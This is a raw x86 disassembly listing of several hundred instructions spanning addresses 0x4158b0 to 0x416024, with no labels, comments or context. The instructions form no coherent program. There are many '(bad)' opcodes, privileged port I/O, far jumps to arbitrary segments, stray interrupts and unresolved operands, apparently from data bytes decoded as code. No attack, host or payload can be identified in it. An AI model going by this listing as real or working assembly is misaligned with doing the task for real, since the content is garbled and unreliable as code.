  4158b0:	jbe    0x415922
  4158b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b3:	sub    dl,BYTE PTR [ebp-0x1a5b8fef]
  4158b9:	aam    0xb0
  4158bb:	in     eax,0xad
  4158bd:	mov    bh,0x38
  4158bf:	in     al,dx
  4158c0:	sub    dl,BYTE PTR [ecx]
  4158c2:	js     0x415920
  4158c4:	sbb    al,0xf
  4158c6:	in     al,dx
  4158c7:	xor    ch,dh
  4158c9:	in     eax,dx
  4158ca:	mov    ds:0xc126aca1,eax
  4158cf:	fld    DWORD PTR ds:0x5a306c94
  4158d5:	xchg   esi,eax
  4158d6:	push   cs
  4158d7:	adc    dl,BYTE PTR [edx-0x506d907d]
  4158dd:	xchg   ecx,eax
  4158de:	imul   ecx,DWORD PTR [eax+0x25],0xfffffffd
  4158e2:	call   0xb388af69
  4158e7:	mov    al,0x1b
  4158e9:	or     BYTE PTR [edi-0x6a2034af],al
  4158ef:	push   ds
  4158f0:	scas   eax,DWORD PTR es:[edi]
  4158f1:	fsub   QWORD PTR [edx+0x45]
  4158f4:	dec    esp
  4158f5:	push   ds
  4158f6:	mov    es,WORD PTR [ecx+edx*1]
  4158f9:	dec    esp
  4158fa:	fistp  QWORD PTR [eax+0xd]
  4158fd:	scas   eax,DWORD PTR es:[edi]
  4158fe:	mov    ah,dh
  415900:	xor    al,0x37
  415902:	mov    ecx,0x2dcd7e93
  415907:	mov    ch,bh
  415909:	cmp    eax,0x65b05bb
  41590e:	loop   0x415961
  415910:	add    al,0x4a
  415912:	aaa    
  415913:	nop
  415914:	xor    BYTE PTR [ecx+0x252c0baa],ah
  41591a:	das    
  41591b:	sub    al,0xe3
  41591d:	and    ebp,ecx
  41591f:	imul   ebp,DWORD PTR [esi+0x4b],0xfffffffd
  415923:	and    ah,cl
  415925:	adc    dl,al
  415927:	dec    ebp
  415928:	dec    edi
  415929:	push   edi
  41592a:	mov    dl,0x57
  41592c:	repz mov bh,0x21
  41592f:	mov    DWORD PTR [eax+edi*1-0x2ca8e9b1],ebx
  415936:	mov    ebx,0xdf0fd7a
  41593b:	sub    al,0x11
  41593d:	shl    DWORD PTR [esi],1
  41593f:	je     0x4158d9
  415941:	ins    BYTE PTR es:[edi],dx
  415942:	out    dx,al
  415943:	stos   BYTE PTR es:[edi],al
  415944:	(bad)  
  415945:	xlat   BYTE PTR ds:[ebx]
  415946:	push   edx
  415947:	sub    DWORD PTR [eax],0xffffffe3
  41594a:	push   edi
  41594b:	nop
  41594c:	loop   0x4158ec
  41594e:	add    ebp,DWORD PTR ds:[edx-0x7da8e359]
  415955:	repnz dec eax
  415957:	push   0x2a97679
  41595c:	aas    
  41595d:	pop    es
  41595e:	aad    0x54
  415960:	pop    ss
  415961:	lds    edi,FWORD PTR [edi-0x7a5798fd]
  415967:	shr    eax,1
  415969:	mov    ecx,0x38f0a09c
  41596e:	cmp    al,0x10
  415970:	mov    WORD PTR [ebx+eiz*2],?
  415973:	mov    eax,ds:0xf8107507
  415978:	cld    
  415979:	dec    edx
  41597a:	into   
  41597b:	mov    edi,0x71655774
  415980:	fldenv [ebx-0x4e]
  415983:	int    0x95
  415985:	aam    0x40
  415987:	sbb    al,0x32
  415989:	xchg   edx,eax
  41598a:	pushf  
  41598b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41598c:	fidiv  DWORD PTR [ebx-0x17]
  41598f:	xor    BYTE PTR [edi-0x63],ah
  415992:	outs   dx,BYTE PTR ds:[esi]
  415993:	xchg   esi,eax
  415994:	fnstenv [eax]
  415996:	js     0x41598d
  415998:	xchg   DWORD PTR [edx],ebp
  41599a:	shl    BYTE PTR [esi-0x71],0x5c
  41599e:	rcr    BYTE PTR [eax+esi*2+0x33],cl
  4159a2:	pusha  
  4159a3:	jno    0x415941
  4159a5:	pop    edx
  4159a6:	out    0x6f,eax
  4159a8:	fisttp WORD PTR [ebp-0x7ed55620]
  4159ae:	inc    edx
  4159af:	in     al,dx
  4159b0:	and    al,0xc0
  4159b2:	push   esp
  4159b3:	xor    esp,DWORD PTR [edi]
  4159b5:	div    DWORD PTR [edi+0x525523da]
  4159bb:	pop    ebp
  4159bc:	sbb    BYTE PTR [edx-0x50919a61],ch
  4159c2:	ficomp WORD PTR [eax+0x2f7dedf]
  4159c8:	xchg   edi,eax
  4159c9:	push   ebx
  4159ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159cb:	xchg   ebp,eax
  4159cc:	pop    ebp
  4159cd:	imul   esp,DWORD PTR [eax],0x58
  4159d0:	cmp    BYTE PTR [ecx-0x27],cl
  4159d3:	fsubr  QWORD PTR [esp+ecx*2+0x31]
  4159d7:	or     eax,esp
  4159d9:	mov    esp,0xe9e77f33
  4159de:	dec    edi
  4159df:	inc    edx
  4159e0:	lods   eax,DWORD PTR ds:[esi]
  4159e1:	cs out dx,eax
  4159e3:	mov    ds:0x9eb61a92,eax
  4159e8:	pop    esi
  4159e9:	imul   BYTE PTR [ebx-0x2f]
  4159ec:	xor    DWORD PTR [ecx+0x4a0bd1d],0x83acf9d8
  4159f6:	out    0x1d,eax
  4159f8:	adc    al,0x65
  4159fa:	xchg   DWORD PTR [esi],eax
  4159fc:	mov    WORD PTR [ebx+0x3e],?
  4159ff:	int    0x41
  415a01:	push   DWORD PTR [edx-0x6b]
  415a04:	hlt    
  415a05:	inc    esp
  415a06:	fwait
  415a07:	pop    esp
  415a08:	cmp    ch,BYTE PTR [edi-0xc]
  415a0b:	or     al,0xe2
  415a0d:	inc    ecx
  415a0e:	cwde   
  415a0f:	and    ebp,edx
  415a11:	adc    al,0xcd
  415a13:	cmp    al,0x89
  415a15:	je     0x415a46
  415a17:	enter  0xcc1f,0xcd
  415a1b:	mov    bh,0x80
  415a1d:	fwait
  415a1e:	xchg   ecx,eax
  415a1f:	sbb    al,0x8e
  415a21:	cdq    
  415a22:	sbb    BYTE PTR [edi-0x4d429438],0x34
  415a29:	(bad)  
  415a2a:	sbb    eax,0x7876a44c
  415a2f:	aas    
  415a30:	test   al,0x52
  415a32:	mov    ah,0x55
  415a34:	dec    ebp
  415a35:	(bad)  
  415a36:	jmp    0x8710:0xfbc8ad05
  415a3d:	popa   
  415a3e:	cmp    dl,BYTE PTR [esi-0x44]
  415a41:	out    0x4e,eax
  415a43:	jne    0x415a51
  415a45:	nop
  415a46:	pop    edi
  415a47:	jl     0x415aa0
  415a49:	mov    ah,0xf5
  415a4b:	imul   esi,ebx,0x65
  415a4e:	inc    esi
  415a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a50:	shr    DWORD PTR [esi-0x21b5fe55],cl
  415a56:	pop    ss
  415a57:	cmp    eax,0xb78ea506
  415a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a5d:	mov    bl,0x8a
  415a5f:	jb     0x415ab9
  415a61:	inc    edx
  415a62:	aaa    
  415a63:	mov    dh,0x8f
  415a65:	dec    edx
  415a66:	xlat   BYTE PTR ds:[ebx]
  415a67:	jg     0x4159f6
  415a69:	in     eax,0x94
  415a6b:	pop    ecx
  415a6c:	mov    edi,DWORD PTR ds:0x9856d61a
  415a72:	pop    eax
  415a73:	push   edi
  415a74:	inc    eax
  415a75:	repnz sbb ebx,DWORD PTR [edi]
  415a78:	loope  0x415aa5
  415a7a:	rol    esp,1
  415a7c:	jae    0x415a54
  415a7e:	hlt    
  415a7f:	inc    ebx
  415a80:	inc    edx
  415a81:	inc    edx
  415a82:	mov    es,WORD PTR [edi]
  415a84:	(bad)  
  415a85:	pushf  
  415a86:	inc    ecx
  415a88:	mov    eax,0x42c0a9c6
  415a8d:	pop    es
  415a8e:	xor    al,0xb4
  415a90:	adc    al,BYTE PTR [esi-0x568ac98f]
  415a96:	ss jbe 0x415ab5
  415a99:	dec    ebp
  415a9a:	bswap  edx
  415a9c:	pop    DWORD PTR [ebx]
  415a9e:	inc    BYTE PTR [ecx]
  415aa0:	dec    ebp
  415aa1:	out    0x5c,eax
  415aa3:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  415aa5:	mov    esp,DWORD PTR [eax]
  415aa7:	push   0xff041ac1
  415aac:	pop    edx
  415aad:	loop   0x415b1c
  415aaf:	cmp    al,0x5f
  415ab1:	cmc    
  415ab2:	mov    ?,WORD PTR [ebp-0x76]
  415ab5:	pop    ds
  415ab6:	pop    ds
  415ab7:	retf   
  415ab8:	dec    esp
  415ab9:	data16 icebp 
  415abb:	and    bl,bh
  415abd:	adc    dh,BYTE PTR [ecx+edi*1+0x7246c342]
  415ac4:	or     bh,BYTE PTR [ecx-0x6268f582]
  415aca:	pop    ebp
  415acb:	adc    eax,DWORD PTR [ebp+0x5452ea80]
  415ad1:	push   cs
  415ad2:	arpl   WORD PTR [ecx],cx
  415ad4:	loop   0x415b29
  415ad6:	(bad)  
  415ad7:	or     DWORD PTR [eax+esi*2-0x75c38982],ebx
  415ade:	ret    0x5044
  415ae1:	cmp    al,0xee
  415ae3:	mov    ebp,0x327d92d
  415ae8:	ficom  DWORD PTR [esi-0x78]
  415aeb:	bound  edx,QWORD PTR [eax-0x77]
  415aee:	jle    0x415ad7
  415af0:	jne    0x415b48
  415af2:	cwde   
  415af3:	inc    ecx
  415af4:	sub    DWORD PTR [ebx-0x48],edx
  415af7:	mov    ebp,0x6b8764c7
  415afc:	in     al,dx
  415afd:	jge    0x415aa5
  415aff:	lea    esi,[ebp-0x6603c302]
  415b05:	xor    ch,ch
  415b07:	pop    edi
  415b08:	cmp    BYTE PTR [esi+edi*8-0x37],0xb3
  415b0d:	xchg   ecx,eax
  415b0e:	mov    esi,0x61e216c1
  415b13:	add    bl,BYTE PTR [ebx]
  415b15:	mov    bl,0x40
  415b17:	sub    BYTE PTR [ecx-0x4f66fce9],cl
  415b1d:	dec    ebx
  415b1e:	xchg   ebx,eax
  415b1f:	stc    
  415b20:	sbb    DWORD PTR [esp+ebx*8],eax
  415b23:	add    BYTE PTR [esi+0x473b7142],cl
  415b29:	push   esi
  415b2a:	add    ecx,DWORD PTR [esi-0x70]
  415b2d:	fld    TBYTE PTR [edx+0x57]
  415b30:	mov    ?,WORD PTR [esi+0x763a3955]
  415b36:	mov    ebp,0xdd4cb1de
  415b3b:	jne    0x415b6a
  415b3d:	lahf   
  415b3e:	cmc    
  415b3f:	mov    BYTE PTR [esi],bh
  415b41:	push   ebx
  415b42:	or     eax,0x49e5f2ed
  415b47:	mov    ?,WORD PTR [esi+ebp*4]
  415b4a:	jp     0x415bca
  415b4c:	jp     0x415b9f
  415b4e:	dec    ecx
  415b4f:	pop    ebp
  415b50:	out    dx,eax
  415b51:	retf   
  415b52:	ins    DWORD PTR es:[edi],dx
  415b53:	enter  0x6bc6,0xcb
  415b57:	mov    bl,0x68
  415b59:	rcl    cl,1
  415b5b:	neg    DWORD PTR [edi+0x1315d308]
  415b61:	mov    edx,0x414dfd36
  415b66:	(bad)  
  415b67:	sti    
  415b68:	sbb    al,0x2
  415b6a:	sbb    edi,DWORD PTR [ecx+0x17]
  415b6d:	cld    
  415b6e:	push   0xf7f43b06
  415b73:	xchg   ebp,eax
  415b74:	push   ds
  415b75:	mov    BYTE PTR [edi-0x25],cl
  415b78:	push   ss
  415b79:	cmc    
  415b7a:	xchg   ebx,eax
  415b7b:	fild   WORD PTR [ecx]
  415b7d:	and    cl,BYTE PTR [edi]
  415b7f:	and    BYTE PTR [eax+ecx*2],ah
  415b82:	(bad)  
  415b83:	repnz add bl,BYTE PTR [ecx+0x2cdc01ee]
  415b8a:	stos   BYTE PTR es:[edi],al
  415b8b:	mov    esp,0xf0dfa5e
  415b90:	shr    DWORD PTR [ecx+0x5b6d5f29],cl
  415b96:	cwde   
  415b97:	fidiv  DWORD PTR cs:[ebx+0x2c]
  415b9b:	inc    ebp
  415b9c:	jle    0x415b55
  415b9e:	inc    edi
  415b9f:	cmc    
  415ba0:	inc    DWORD PTR [eax-0xc]
  415ba3:	fs ja  0x415b51
  415ba6:	repz sbb DWORD PTR [eax+0x56],esi
  415baa:	push   ss
  415bab:	iret   
  415bac:	add    BYTE PTR [ecx],0xbd
  415baf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bb0:	dec    esi
  415bb1:	addr16 mov ds:0x6e4,eax
  415bb5:	mov    esi,0x52ef0717
  415bba:	jl     0x415bd6
  415bbc:	push   ds
  415bbd:	sub    esi,DWORD PTR [edx-0x55338097]
  415bc3:	sahf   
  415bc4:	xchg   esi,eax
  415bc5:	and    eax,0x5fd1828b
  415bca:	dec    eax
  415bcb:	pusha  
  415bcc:	xchg   BYTE PTR [esi-0x7e],ch
  415bcf:	dec    esi
  415bd0:	rcl    DWORD PTR [ecx+0x12],1
  415bd3:	ficomp DWORD PTR [edx+0xa]
  415bd6:	imul   esp,DWORD PTR [edx+esi*4+0x48],0xca7303e5
  415bde:	test   DWORD PTR [ebx-0x47349db6],ebx
  415be4:	sub    cl,BYTE PTR [ebp-0x52]
  415be7:	push   cs
  415be8:	outs   dx,DWORD PTR ds:[esi]
  415bea:	fcomp  QWORD PTR [ebx]
  415bec:	repnz inc ebp
  415bee:	xor    eax,0xf8db41c0
  415bf3:	stc    
  415bf4:	scas   al,BYTE PTR es:[edi]
  415bf5:	inc    edx
  415bf6:	mov    esi,0x94335b76
  415bfb:	clc    
  415bfc:	sbb    BYTE PTR [edx-0x7b],al
  415bff:	jae    0x415bee
  415c01:	xchg   esp,eax
  415c02:	xchg   esi,eax
  415c03:	mov    ebx,0xe5ee87d3
  415c08:	cmp    eax,0xb544abdd
  415c0d:	and    ebx,0x8
  415c10:	push   ebp
  415c11:	inc    esp
  415c12:	adc    al,ah
  415c14:	mov    DWORD PTR [edi-0x1bb29ac3],esi
  415c1a:	inc    eax
  415c1b:	add    ebp,DWORD PTR [edx-0x7]
  415c1e:	push   esi
  415c1f:	or     eax,0x2b07491e
  415c24:	sahf   
  415c25:	mov    ds:0x111b2903,eax
  415c2a:	ret    0x20f4
  415c2d:	pop    edx
  415c2e:	enter  0x4391,0xe0
  415c32:	ret    
  415c33:	add    BYTE PTR [ebp+0xd6b1ca8],dh
  415c39:	cmp    ebp,DWORD PTR [ecx-0x4f457c3b]
  415c3f:	or     eax,0x44874d1c
  415c44:	fsub   st(6),st
  415c46:	mov    edi,cs
  415c48:	dec    esi
  415c49:	fwait
  415c4a:	loopne 0x415cba
  415c4c:	je     0x415c7e
  415c4e:	js     0x415c10
  415c50:	(bad)  
  415c51:	fsubr  DWORD PTR [eax]
  415c53:	pop    esi
  415c54:	pop    ecx
  415c55:	vpsadbw xmm7,xmm0,XMMWORD PTR ds:0xc50b3d2d
  415c5d:	push   es
  415c5e:	(bad)  
  415c5f:	pop    ebx
  415c60:	inc    eax
  415c61:	mov    al,ds:0x3721a2df
  415c66:	shr    DWORD PTR [edi+0x2],0x78
  415c6a:	mov    ds:0x702c1aae,al
  415c6f:	not    BYTE PTR gs:[esi+0x35]
  415c73:	int3   
  415c74:	enter  0xfc21,0x72
  415c78:	jmp    0x3085d281
  415c7d:	repz adc bh,BYTE PTR [ecx-0x38]
  415c81:	(bad)  
  415c82:	or     bl,BYTE PTR [eax]
  415c84:	pop    edx
  415c85:	jcxz   0x415c29
  415c88:	outs   dx,DWORD PTR ds:[esi]
  415c89:	xor    al,0x79
  415c8b:	lock sbb al,0xde
  415c8e:	xchg   edi,eax
  415c8f:	push   cs
  415c90:	test   al,0xe9
  415c92:	sahf   
  415c93:	aaa    
  415c94:	fwait
  415c95:	add    BYTE PTR [ebx-0x26bbd65c],al
  415c9b:	stc    
  415c9c:	mov    ss,WORD PTR [esi]
  415c9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c9f:	jns    0x415c76
  415ca1:	lods   eax,DWORD PTR ds:[esi]
  415ca2:	inc    ebx
  415ca3:	and    cl,bh
  415ca5:	rcr    DWORD PTR [ebx-0x488eda60],0xb3
  415cac:	dec    edx
  415cad:	and    bl,BYTE PTR [ebp+edx*1-0x18]
  415cb1:	push   eax
  415cb2:	push   edi
  415cb3:	jmp    0x415c92
  415cb5:	dec    ecx
  415cb6:	retf   
  415cb7:	fcmovnbe st,st(4)
  415cb9:	cmp    ch,cl
  415cbb:	push   ebp
  415cbc:	lahf   
  415cbd:	xor    edi,esp
  415cbf:	inc    edx
  415cc0:	out    dx,eax
  415cc1:	xor    bh,BYTE PTR [edi-0x32]
  415cc4:	out    0x6,al
  415cc6:	aam    0x42
  415cc8:	(bad)  [ebp+0x7b]
  415ccb:	call   esi
  415ccd:	les    edi,FWORD PTR [edi+0x16]
  415cd0:	jne    0x415cc5
  415cd2:	and    DWORD PTR [edi],ebx
  415cd4:	and    eax,0x7b0ee1f2
  415cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cda:	out    dx,al
  415cdb:	es in  eax,dx
  415cdd:	jecxz  0x415d01
  415cdf:	maxps  xmm5,XMMWORD PTR [ebp+0x77]
  415ce3:	pop    ecx
  415ce4:	push   esi
  415ce5:	ror    BYTE PTR ds:0x811b62ab,0x1d
  415cec:	sub    eax,DWORD PTR [ecx+0x2a348c48]
  415cf2:	mov    ds:0x38ab9a84,al
  415cf7:	pop    eax
  415cf8:	cmc    
  415cf9:	cmp    al,0xe4
  415cfb:	jns    0x415d54
  415cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cfe:	cs ins DWORD PTR es:[edi],dx
  415d00:	movaps xmm5,xmm5
  415d03:	dec    eax
  415d04:	ret    
  415d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d06:	into   
  415d07:	xchg   ecx,eax
  415d08:	or     al,0x2a
  415d0a:	xor    edx,DWORD PTR [eax-0x26eb3a2a]
  415d10:	int3   
  415d11:	cs out 0xbf,al
  415d14:	pushf  
  415d15:	add    dl,BYTE PTR [eax]
  415d17:	je     0x415ca4
  415d19:	push   esp
  415d1a:	adc    DWORD PTR [edx],edx
  415d1c:	mov    eax,0xd7f529e
  415d21:	iret   
  415d22:	pop    ebx
  415d23:	push   ebp
  415d24:	ficomp WORD PTR [eax+ebp*4-0x6c3f13f1]
  415d2b:	jno    0x415d9d
  415d2d:	cs cmc 
  415d2f:	sar    al,1
  415d31:	jp     0x415cfb
  415d33:	adc    BYTE PTR [ebp+0x1daab147],0x3e
  415d3a:	call   0x15a7b962
  415d3f:	sbb    al,0xb5
  415d41:	call   0xd39f:0xda6479c3
  415d48:	xlat   BYTE PTR ds:[ebx]
  415d49:	adc    esi,esi
  415d4b:	pop    ebx
  415d4c:	in     eax,0x31
  415d4e:	push   0xe316d675
  415d53:	push   ebp
  415d54:	sub    eax,0xa7ca7cd2
  415d59:	pop    edx
  415d5a:	ins    DWORD PTR es:[edi],dx
  415d5b:	addr16 repnz inc edx
  415d5e:	popf   
  415d5f:	(bad)  
  415d60:	not    BYTE PTR [ebx-0x1e]
  415d63:	pop    esi
  415d64:	mul    DWORD PTR [eax-0x15]
  415d67:	(bad)
  415d6b:	rcl    DWORD PTR [edi-0x473ad49d],1
  415d71:	popa   
  415d72:	sub    ah,0xe2
  415d75:	loop   0x415d78
  415d77:	int3   
  415d78:	(bad)  
  415d7a:	cmp    al,bh
  415d7c:	popf   
  415d7d:	popa   
  415d7e:	pop    ds
  415d7f:	push   0xffffff84
  415d81:	xor    ch,0x21
  415d84:	mov    ah,0x18
  415d86:	cmp    al,0x70
  415d88:	mov    al,0xe3
  415d8a:	mov    gs,edi
  415d8c:	mov    ds:0xc4c64264,eax
  415d91:	addr16 js 0x415d5a
  415d94:	repz lahf 
  415d96:	(bad)  
  415d97:	sbb    BYTE PTR [esi],ch
  415d99:	mov    WORD PTR [eax+0xc],es
  415d9c:	aam    0xbc
  415d9e:	arpl   bx,si
  415da0:	aad    0xcf
  415da2:	xor    bl,0xd
  415da5:	cdq    
  415da6:	mov    esp,0xe1fdb913
  415dab:	pop    ebx
  415dac:	push   esp
  415dad:	add    edi,ebp
  415daf:	xor    eax,0xe2e6533f
  415db4:	popf   
  415db5:	pop    es
  415db6:	into   
  415db7:	js     0x415db9
  415db9:	xor    ch,dl
  415dbb:	addr16 push ebp
  415dbd:	mov    dh,0x2
  415dbf:	cld    
  415dc0:	push   ds
  415dc1:	push   esp
  415dc2:	and    BYTE PTR [edx+eax*1-0x545059a],dh
  415dc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dca:	js     0x415d77
  415dcc:	in     al,0x8e
  415dce:	adc    edx,ecx
  415dd0:	cmp    dh,BYTE PTR [esi+0xe32007a]
  415dd6:	pop    esp
  415dd7:	mov    ecx,0xaa524194
  415ddc:	push   edx
  415ddd:	mov    ebx,0x248ee14b
  415de2:	cdq    
  415de3:	jmp    0x1a22b075
  415de8:	call   0x50f77a42
  415ded:	push   ebx
  415dee:	and    eax,ebx
  415df0:	lods   eax,DWORD PTR ds:[esi]
  415df1:	stc    
  415df2:	add    bh,cl
  415df4:	cli    
  415df5:	pop    ds
  415df6:	addr16 adc al,0x12
  415df9:	adc    ch,ch
  415dfb:	ja     0x415da2
  415dfd:	pop    esi
  415dfe:	add    cl,0x14
  415e01:	pop    ebp
  415e02:	xchg   esi,eax
  415e03:	in     eax,dx
  415e04:	push   ebp
  415e05:	xlat   BYTE PTR ds:[ebx]
  415e06:	pusha  
  415e07:	dec    eax
  415e08:	xchg   ecx,eax
  415e09:	lods   al,BYTE PTR ds:[esi]
  415e0a:	jnp    0x415db7
  415e0c:	cli    
  415e0d:	(bad)  [edx-0x74232b25]
  415e13:	jge    0x415e03
  415e15:	ja     0x415ded
  415e17:	and    BYTE PTR [ebx+0x434a8aca],ch
  415e1d:	or     eax,DWORD PTR [edi]
  415e1f:	jnp    0x415e7a
  415e21:	mov    al,dl
  415e23:	sbb    eax,0x6382a2ee
  415e28:	adc    al,0xd0
  415e2a:	out    dx,al
  415e2b:	test   DWORD PTR [ebx+0x2],ebx
  415e2e:	out    dx,eax
  415e2f:	out    0x3,al
  415e31:	inc    ecx
  415e32:	ins    BYTE PTR es:[edi],dx
  415e33:	xchg   edi,eax
  415e34:	push   ebp
  415e35:	cmc    
  415e36:	loope  0x415dbd
  415e38:	icebp  
  415e39:	cmp    eax,0x6ac02abe
  415e3e:	pop    ecx
  415e3f:	mov    esi,0x93a74ffa
  415e44:	sub    ebp,edi
  415e46:	shl    ebp,cl
  415e48:	ret    0xebc2
  415e4b:	fdiv   DWORD PTR [eax+0x43]
  415e4e:	sub    al,0xda
  415e50:	in     al,dx
  415e51:	xchg   DWORD PTR [eax-0x44],edx
  415e54:	adc    eax,0x49ed188f
  415e59:	in     eax,0xd2
  415e5b:	push   edx
  415e5c:	pop    ds
  415e5d:	enter  0x8617,0x9b
  415e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e62:	jp     0x415def
  415e64:	shl    BYTE PTR [ebx],cl
  415e66:	sti    
  415e67:	test   al,0xdd
  415e69:	cmp    DWORD PTR [edi-0x60],ecx
  415e6c:	inc    esi
  415e6d:	mov    bl,0xf
  415e6f:	lea    ebp,ds:[ebx]
  415e72:	jmp    0x226b:0x3ede5105
  415e79:	mov    ebx,0x2e35b5aa
  415e7e:	xor    edx,DWORD PTR [eax-0x5d261fe3]
  415e84:	(bad)  
  415e85:	adc    cl,BYTE PTR [ebp+0x484b5f23]
  415e8b:	int3   
  415e8c:	pop    ebx
  415e8d:	inc    esi
  415e8e:	jae    0x415e38
  415e90:	imul   esp,DWORD PTR [edx+0x52],0xfffffff7
  415e94:	aas    
  415e95:	repnz xlat BYTE PTR ds:[ebx]
  415e97:	test   dl,ch
  415e99:	push   cs
  415e9a:	adc    DWORD PTR [eax],0xffffffc8
  415e9d:	push   ebx
  415e9e:	ja     0x415ec5
  415ea0:	aad    0xa
  415ea2:	jg     0x415e7c
  415ea4:	cwde   
  415ea5:	jg     0x415ebb
  415ea7:	mov    dh,0xca
  415ea9:	push   es
  415eaa:	lock fstp TBYTE PTR [esi+0x1a]
  415eae:	push   0xcf28eef4
  415eb3:	sub    BYTE PTR [edx+eiz*1],0x9b
  415eb7:	fwait
  415eb8:	cmp    BYTE PTR [edi],0xe2
  415ebb:	clc    
  415ebc:	fcom   QWORD PTR [edx+ebp*8+0x1f]
  415ec0:	mov    ebx,0xc038c001
  415ec5:	xor    eax,0xeab26335
  415eca:	daa    
  415ecb:	pop    ecx
  415ecc:	popf   
  415ecd:	mov    ecx,0x7eb48590
  415ed2:	loopne 0x415ea7
  415ed4:	inc    eax
  415ed5:	mov    esp,esi
  415ed7:	inc    edx
  415ed8:	ret    
  415ed9:	iret   
  415eda:	push   ds
  415edb:	nop
  415edc:	rol    BYTE PTR [ebx+edx*1+0x7e],cl
  415ee0:	push   esi
  415ee1:	xor    eax,0xd246d92b
  415ee6:	out    0xea,eax
  415ee8:	add    ch,dl
  415eea:	xchg   DWORD PTR [ebx+0x23],esp
  415eed:	sbb    BYTE PTR [ebp+0x5f],ah
  415ef0:	mov    ch,0x19
  415ef2:	sbb    ebx,ecx
  415ef4:	sahf   
  415ef5:	pop    esi
  415ef6:	std    
  415ef7:	imul   edx,DWORD PTR ds:0xd360747f,0x6e
  415efe:	ins    DWORD PTR es:[edi],dx
  415eff:	add    ebp,DWORD PTR [ecx-0x5d]
  415f02:	xchg   esi,eax
  415f03:	add    ch,BYTE PTR [ebp-0x18]
  415f06:	jl     0x415ed0
  415f08:	xchg   esi,esi
  415f0a:	sbb    DWORD PTR [edi-0x6287274a],esi
  415f10:	je     0x415ecd
  415f12:	jo     0x415eae
  415f14:	int    0x2c
  415f16:	jmp    0xbe5ba32e
  415f1b:	call   0xda58:0x77b9e3cd
  415f22:	int    0x2a
  415f24:	mov    ebp,0xd0adc3b4
  415f29:	in     al,0x97
  415f2b:	popa   
  415f2c:	jge    0x415f65
  415f2e:	ret    
  415f2f:	cmp    ebp,0xe25a2557
  415f35:	sub    eax,0x7009b27e
  415f3a:	aam    0x63
  415f3c:	cdq    
  415f3d:	pop    edx
  415f3e:	pop    edx
  415f3f:	aas    
  415f40:	ror    BYTE PTR [edi+0x21829b6c],cl
  415f46:	or     al,0x6f
  415f48:	dec    edx
  415f49:	xchg   ebx,eax
  415f4a:	sub    DWORD PTR [edi+0x3333e167],0x956dccc9
  415f54:	std    
  415f55:	je     0x415f39
  415f57:	pop    edx
  415f58:	sti    
  415f59:	sub    cl,ah
  415f5b:	aam    0x20
  415f5d:	retf   
  415f5e:	shr    DWORD PTR ds:[ebx+eiz*8],cl
  415f62:	mov    ebx,0x942fa6a1
  415f67:	or     bl,dh
  415f69:	mov    DWORD PTR [ecx+0x4a397158],ebx
  415f6f:	aas    
  415f70:	das    
  415f71:	in     eax,dx
  415f72:	xlat   BYTE PTR ds:[ebx]
  415f73:	(bad)  
  415f74:	iret   
  415f75:	loop   0x415f14
  415f77:	inc    ebp
  415f78:	xchg   esp,eax
  415f79:	add    eax,0x6cadb43e
  415f7e:	ins    DWORD PTR es:[edi],dx
  415f7f:	push   edx
  415f80:	fldl2e 
  415f82:	pop    esi
  415f83:	jge    0x415f95
  415f85:	mov    cl,0x8
  415f87:	iret   
  415f88:	jmp    0x8829:0x9be0ae44
  415f8f:	cmp    edi,ebx
  415f91:	push   ss
  415f92:	mov    dh,BYTE PTR ds:0xfe53adb1
  415f98:	(bad)  [ebp+0x5c]
  415f9b:	cmp    al,0xb8
  415f9d:	add    cl,BYTE PTR [esi-0x67cd5d70]
  415fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fa4:	adc    DWORD PTR [eax+0x62],esp
  415fa7:	pop    ss
  415fa8:	jmp    0x415fb2
  415faa:	sbb    ebp,DWORD PTR [esi]
  415fac:	fcmove st,st(0)
  415fae:	daa    
  415faf:	mov    cl,0xc8
  415fb1:	popa   
  415fb2:	icebp  
  415fb3:	shl    BYTE PTR [esi-0x67],cl
  415fb6:	jp     0x415f46
  415fb8:	retf   0x2ad
  415fbb:	xor    al,0x9a
  415fbd:	out    0xcc,al
  415fbf:	bound  edx,QWORD PTR [ebp-0x79]
  415fc2:	adc    BYTE PTR [esi+0x5f],cl
  415fc5:	mov    WORD PTR [ebx],?
  415fc7:	jg     0x415f52
  415fc9:	mov    ch,0xaf
  415fcb:	xchg   esi,eax
  415fcc:	mov    al,ds:0x2082e42e
  415fd1:	xchg   ecx,eax
  415fd2:	out    dx,eax
  415fd3:	sbb    BYTE PTR [esi-0x69],dh
  415fd6:	lods   al,BYTE PTR ds:[esi]
  415fd7:	or     esp,DWORD PTR [esp+esi*2+0x784003cb]
  415fde:	jbe    0x415ff2
  415fe0:	popa   
  415fe1:	xchg   esp,eax
  415fe2:	jbe    0x415fb0
  415fe4:	dec    esp
  415fe5:	xchg   ebp,eax
  415fe6:	add    eax,0x339df5ed
  415feb:	rcl    BYTE PTR [eax+0x75],1
  415fee:	lock sub eax,0xbdbf574c
  415ff4:	dec    ebp
  415ff5:	mov    bh,0x22
  415ff7:	ja     0x416043
  415ff9:	lahf   
  415ffa:	push   ebp
  415ffb:	fs adc ebx,edi
  415ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fff:	mov    al,ds:0xfdac48e0
  416004:	call   0x990d7e6c
  416009:	imul   ecx,DWORD PTR [ebx-0x13],0xffffff9b
  41600d:	ds ins BYTE PTR es:[edi],dx
  41600f:	mov    dl,0x98
  416011:	mov    al,ds:0xd2f66d7c
  416016:	clc    
  416017:	jne    0x41605f
  416019:	xor    BYTE PTR [edx-0x5d3e8bc2],cl
  41601f:	xchg   esi,eax
  416020:	push   cs
  416021:	cli    
  416022:	xchg   ebp,eax
  416023:	pop    ecx
  416024:	jecxz  0x416006
